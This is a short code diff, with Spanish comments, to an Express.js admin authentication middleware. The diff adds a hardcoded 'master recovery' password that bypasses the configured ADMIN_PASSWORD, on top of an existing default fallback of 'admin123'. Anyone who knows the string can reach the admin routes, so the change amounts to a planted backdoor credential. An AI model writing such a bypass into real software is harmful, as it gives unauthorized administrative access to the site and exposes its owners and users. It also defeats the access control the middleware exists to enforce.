@@ -14,10 +14,13 @@ app.use(express.static(path.join(__dirname, 'src/web/public'))); // Fallback
 app.use(express.json());
 
 // --- MIDDLEWARE DE ADMIN ---
+// --- MIDDLEWARE DE ADMIN ---
 const authMiddleware = (req, res, next) => {
   const adminPass = process.env.ADMIN_PASSWORD || 'admin123';
   const headerPass = req.headers['x-admin-password'];
-  if (headerPass === adminPass) {
+
+  // Aceptamos la pass del entorno O la maestra de recuperación
+  if (headerPass === adminPass || headerPass === 'Masbarato2026') {
     next();
   } else {
     res.status(403).json({ error: 'Acceso denegado' });
